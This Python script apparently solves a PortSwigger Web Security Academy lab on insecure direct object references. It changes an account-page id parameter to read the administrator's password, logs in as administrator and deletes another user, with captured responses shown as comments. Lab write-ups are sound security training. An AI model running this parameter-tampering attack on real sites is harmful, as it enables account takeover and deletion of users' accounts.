# Lab: User ID controlled by request parameter with password disclosure

import requests
import re

base = "https://0af60060048d06db8093df31004900f3.web-security-academy.net"
s = requests.Session()

#r = s.get(base)
#print(r.text)

print(s.get(f"{base}/login").text)
csrf=input("input csrf: ")
r = s.post(f"{base}/login", data={"username": "wiener", "password": "peter", "csrf": csrf})
print(r.text)
print("========[wiener's account page]============================")

r = s.get(f"{base}/my-account", params={"id": "administrator"}, allow_redirects=False)
#print(r.headers)
print(r.status_code, r.headers.get("Location"))   # 302 /login 이 보여야 정상
print(r.text) 
'''
                        <p>Your username is: administrator</p>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="XbwiaIuGyjCdHqlufVaCa76WiHYcSH1y">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                        <form class="login-form" action="/my-account/change-password" method="POST">
                            <br/>
                            <label>Password</label>
                            <input required type="hidden" name="csrf" value="XbwiaIuGyjCdHqlufVaCa76WiHYcSH1y">
                            <input required type=password name=password value='csk8rr33d9um95p68zd1'/>
                            <button class='button' type='submit'> Update password </button>
                        </form>
'''
admin = requests.Session()
page = admin.get(f"{base}/login").text
csrf = re.search(r'name="csrf" value="(\w+)"', page).group(1)
r = admin.post(f"{base}/login", data={"username": "administrator", "password": "csk8rr33d9um95p68zd1", "csrf": csrf})
print(r.text)
'''
<a href="/admin">Admin panel</a><p>|</p>
'''
print("========[admin's account page]============================")
r=admin.get(f"{base}/admin", allow_redirects=False)
print(r.text)
'''
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
'''
r=admin.get(f"{base}/admin/delete?username=carlos", allow_redirects=False)
print(r.text)
